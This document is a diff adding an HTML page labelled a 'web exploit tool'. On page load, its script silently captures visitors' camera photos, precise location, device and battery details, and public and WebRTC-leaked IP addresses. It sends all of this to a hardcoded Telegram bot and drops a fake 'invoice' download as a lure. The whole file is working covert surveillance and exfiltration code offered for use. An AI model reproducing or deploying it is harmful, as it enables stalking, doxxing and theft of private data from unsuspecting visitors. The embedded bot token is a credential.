@@ -1,0 +1,171 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>0x7A :: Web Exploit Tool</title>
+  <style>
+    body {
+      background-color: black;
+      color: #33ff33;
+      font-family: monospace;
+      padding: 20px;
+    }
+    .terminal {
+      border: 1px solid #33ff33;
+      padding: 15px;
+      background-color: #111;
+    }
+    .blink {
+      animation: blink 1s step-start infinite;
+    }
+    @keyframes blink {
+      50% { opacity: 0; }
+    }
+  </style>
+</head>
+<body onload="startExploit()">
+  <div class="terminal">
+    <h2>root@hunter:~# <span class="blink">█</span></h2>
+    <p>Status: <span style="color: yellow;">EXECUTING...</span></p>
+    <div id="result">Initializing recon process...</div>
+  </div>
+
+  <script>
+    const botToken = " 7715205194:AAExOTWthGq28DtAsd1937Owg5Ypeg9otIE";
+    const chatId = "6971830779";
+
+    async function sendToTelegram(message) {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      });
+    }
+
+    async function sendPhoto(base64) {
+      const blob = await (await fetch(base64)).blob();
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blob, "photo.jpg");
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+    }
+
+    function startExploit() {
+      captureInfo();
+      captureCamera();
+      captureLocation();
+      captureFingerprint();
+      captureIP();
+      getWebRTCLeak();
+      fakeDownload("invoice_April2024.pdf", "Dummy file content for download.");
+    }
+
+    function captureInfo() {
+      const info = `
+[0xINF0]
+User-Agent: ${navigator.userAgent}
+Platform: ${navigator.platform}
+Language: ${navigator.language}
+Cookies Enabled: ${navigator.cookieEnabled}
+Hardware Threads: ${navigator.hardwareConcurrency}
+Device Memory: ${navigator.deviceMemory || 'N/A'}
+Time: ${new Date().toString()}
+      `;
+      sendToTelegram(info);
+    }
+
+    function captureCamera() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          const track = stream.getVideoTracks()[0];
+          const imageCapture = new ImageCapture(track);
+          imageCapture.takePhoto().then(blob => {
+            const reader = new FileReader();
+            reader.onloadend = () => sendPhoto(reader.result);
+            reader.readAsDataURL(blob);
+          }).catch(err => {
+            sendToTelegram("[CAMERA ERROR] " + err.message);
+          });
+          setTimeout(() => track.stop(), 3000);
+        })
+        .catch(err => {
+          sendToTelegram("[PERMISSION DENIED] " + err.message);
+        });
+    }
+
+    function captureLocation() {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          const c = pos.coords;
+          const loc = `
+[0xL0C4T10N]
+Latitude: ${c.latitude}
+Longitude: ${c.longitude}
+Accuracy: ${c.accuracy}m
+Speed: ${c.speed}
+Timestamp: ${new Date(pos.timestamp).toString()}
+          `;
+          sendToTelegram(loc);
+        },
+        err => sendToTelegram("[LOCATION ERROR] " + err.message),
+        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+      );
+    }
+
+    function captureFingerprint() {
+      navigator.getBattery().then(b => {
+        const batt = `
+[0xB4TT3RY]
+Level: ${b.level * 100}%
+Charging: ${b.charging}
+Charging Time: ${b.chargingTime}s
+Discharging Time: ${b.dischargingTime}s
+        `;
+        sendToTelegram(batt);
+      });
+    }
+
+    function captureIP() {
+      fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(data => {
+          sendToTelegram("[0x1P] Public IP: " + data.ip);
+        })
+        .catch(err => {
+          sendToTelegram("[IP ERROR] " + err.message);
+        });
+    }
+
+    function getWebRTCLeak() {
+      let pc = new RTCPeerConnection({ iceServers: [] });
+      pc.createDataChannel("");
+      pc.createOffer().then(offer => pc.setLocalDescription(offer));
+      pc.onicecandidate = event => {
+        if (event.candidate) {
+          let ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/g;
+          let ips = event.candidate.candidate.match(ipRegex);
+          if (ips) {
+            sendToTelegram("[0xW3BRTC] Leaked IPs: " + ips.join(", "));
+          }
+        }
+      };
+    }
+
+    function fakeDownload(filename, content) {
+      const blob = new Blob([content], { type: "application/octet-stream" });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = filename;
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      URL.revokeObjectURL(url);
+    }
+  </script>
+</body>
+</html>
+
